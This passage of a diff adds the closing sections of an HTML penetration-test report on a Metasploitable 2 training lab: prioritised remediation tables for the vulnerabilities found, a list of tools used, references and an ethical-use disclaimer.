+        <tbody>
+          <tr><td><span style="color:#8b0000;font-weight:700;">P1</span></td><td>Isolate the system from all networks immediately</td><td>All findings</td></tr>
+          <tr><td><span style="color:#8b0000;font-weight:700;">P1</span></td><td>Upgrade OS to Ubuntu 22.04 LTS or 24.04 LTS</td><td>EOL OS, all unpatched CVEs</td></tr>
+          <tr><td><span style="color:#8b0000;font-weight:700;">P1</span></td><td>Remove or replace UnrealIRCd — verify integrity of any replacement binary</td><td>IRC Backdoor (CVE-2010-2075)</td></tr>
+          <tr><td><span style="color:#8b0000;font-weight:700;">P1</span></td><td>Close port 1524 at firewall; investigate presence of bind shell</td><td>Bind Shell Backdoor</td></tr>
+          <tr><td><span style="color:#8b0000;font-weight:700;">P1</span></td><td>Set a strong VNC password (min. 12 chars) or disable VNC entirely</td><td>VNC Weak Password</td></tr>
+          <tr><td><span style="color:#8b0000;font-weight:700;">P1</span></td><td>Disable SSL v2 and SSL v3 on all services; enforce TLS 1.2+</td><td>POODLE/DROWN</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="sub-title">Short-Term (High — Within 7 Days)</div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Action</th><th>Addresses</th></tr></thead>
+        <tbody>
+          <tr><td>Restrict NFS exports — never export <code>/</code> to <code>*</code>. Use specific IP/host restrictions and read-only flags.</td><td>NFS World-Readable</td></tr>
+          <tr><td>Disable rlogin (port 513) and rsh (port 514). Remove from /etc/inetd.conf. Use SSH for remote access.</td><td>rlogin / rsh</td></tr>
+          <tr><td>Upgrade Apache Tomcat to 7.0.100 / 8.5.51 / 9.0.31+. Require AJP authorization or disable AJP connector.</td><td>Ghostcat CVE-2020-1745</td></tr>
+          <tr><td>Upgrade phpMyAdmin to 4.8.6 or latest stable version.</td><td>SQLi, XSS findings</td></tr>
+          <tr><td>Implement WAF / input validation on all CGI applications. Disable directory traversal in web apps.</td><td>SQLi, LFI, RFI, XST, XSS</td></tr>
+          <tr><td>Upgrade Samba to 4.2.11 / 4.3.8 / 4.4.2 or later and apply Badlock patch.</td><td>Samba Badlock CVE-2016-2118</td></tr>
+          <tr><td>Replace vsftpd 2.3.4 with a patched version. Verify binary integrity.</td><td>vsftpd backdoor</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="sub-title">Medium-Term (Medium — Within 30 Days)</div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Action</th><th>Addresses</th></tr></thead>
+        <tbody>
+          <tr><td>Configure DNS server to restrict recursive queries. Implement query rate limiting.</td><td>DNS Amplification DDoS</td></tr>
+          <tr><td>Disable HTTP TRACE/TRACK methods in Apache. Add <code>TraceEnable Off</code> to Apache config.</td><td>HTTP TRACE/TRACK XST</td></tr>
+          <tr><td>Remove EXPORT_RSA cipher suites. Enable only TLS 1.2/1.3 with strong cipher suites (AES-GCM, ChaCha20).</td><td>FREAK, TLS 1.0, Logjam</td></tr>
+          <tr><td>Regenerate Diffie-Hellman parameters to 2048 bits or higher.</td><td>Logjam CVE-2015-4000</td></tr>
+          <tr><td>Restrict X11 access. Disable X11 TCP listening with <code>-nolisten tcp</code>.</td><td>X11 Exposure</td></tr>
+          <tr><td>Block ICMP timestamp requests (type 13) and replies (type 14) at firewall.</td><td>ICMP Timestamp Disclosure</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+
+  <!-- ══════════════════════════════════════════
+       §11  APPENDIX
+  ═══════════════════════════════════════════ -->
+  <div id="appendix">
+    <div class="section-title">
+      <div class="section-num">11</div>
+      <h2>Appendix — Tools &amp; References</h2>
+      <div class="line"></div>
+    </div>
+
+    <div class="sub-title">Tools Used</div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Tool</th><th>Version</th><th>Purpose</th><th>Phase</th></tr></thead>
+        <tbody>
+          <tr><td>Nmap</td><td>7.94</td><td>Host discovery, port scanning, service version detection, OS fingerprinting</td><td>1, 2</td></tr>
+          <tr><td>Nessus Essentials</td><td>10.x</td><td>Automated vulnerability assessment, CVE mapping</td><td>3</td></tr>
+          <tr><td>Metasploit Framework</td><td>6.x</td><td>Exploit execution, payload delivery, post-exploitation</td><td>4, 5</td></tr>
+          <tr><td>Wireshark</td><td>4.x</td><td>Network traffic capture and analysis</td><td>2</td></tr>
+          <tr><td>Netcat (nc)</td><td>—</td><td>Bind shell connection, banner grabbing</td><td>4</td></tr>
+          <tr><td>smbclient</td><td>—</td><td>Samba share enumeration</td><td>2</td></tr>
+          <tr><td>showmount</td><td>—</td><td>NFS export enumeration</td><td>2</td></tr>
+          <tr><td>vncviewer</td><td>—</td><td>VNC authentication testing</td><td>4</td></tr>
+          <tr><td>curl / Browser</td><td>—</td><td>Web application testing, XSS, LFI, RFI verification</td><td>3, 4</td></tr>
+          <tr><td>Kali Linux</td><td>2024.1</td><td>Attack platform — all tools run from this OS</td><td>All</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="sub-title">References &amp; Standards</div>
+    <div class="card">
+      <p><strong>PTES</strong> — Penetration Testing Execution Standard: <a href="http://www.pentest-standard.org">pentest-standard.org</a></p>
+      <p><strong>OWASP Testing Guide v4.2</strong>: <a href="https://owasp.org/www-project-web-security-testing-guide">owasp.org</a></p>
+      <p><strong>NIST SP 800-115</strong> — Technical Guide to Information Security Testing and Assessment</p>
+      <p><strong>CVE Database</strong>: <a href="https://nvd.nist.gov">nvd.nist.gov</a></p>
+      <p><strong>Rapid7 Metasploitable 2 Guide</strong>: <a href="https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide">docs.rapid7.com</a></p>
+      <p><strong>GitHub Repository</strong>: <a href="https://github.com/buni112905-lab/VAPT-project">github.com/buni112905-lab/VAPT-project</a></p>
+    </div>
+  </div>
+
+
+  <!-- ══════════════════════════════════════════
+       §12  DISCLAIMER
+  ═══════════════════════════════════════════ -->
+  <div id="disclaimer">
+    <div class="section-title">
+      <div class="section-num">12</div>
+      <h2>Disclaimer</h2>
+      <div class="line"></div>
+    </div>
+    <div class="card">
+      <div class="callout warning">
+        <span class="callout-icon">&#9888;</span>
+        <div class="callout-body">
+          <strong>Legal &amp; Ethical Notice</strong><br>
+          This Vulnerability Assessment and Penetration Testing (VAPT) report was produced strictly for <strong>educational and training purposes</strong> in a self-contained, isolated virtual lab environment using Metasploitable 2 — an intentionally vulnerable system created by Rapid7 specifically for security training.<br><br>
+          All exploits, techniques, and tools documented in this report were executed <strong>only against the authorized target</strong> within a controlled environment. Reproducing any of the attack techniques described in this report against systems, networks, or applications you do not own or have explicit written authorization to test is <strong>illegal and unethical</strong>.<br><br>
+          The findings in this report reflect the state of the intentionally vulnerable Metasploitable 2 image and should not be used to infer the security posture of any real-world system. The author of this report accepts no liability for misuse of the information contained herein.
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /page -->
+
+<div class="footer">
+  <div><strong>VAPT Report</strong> — Metasploitable 2 / 192.161.16.133</div>
+  <div>Prepared by: buni112905-lab &nbsp;|&nbsp; February 23, 2026</div>
+  <div>CONFIDENTIAL &mdash; Authorized Testing Only</div>
+</div>
+
+</body>
+</html>
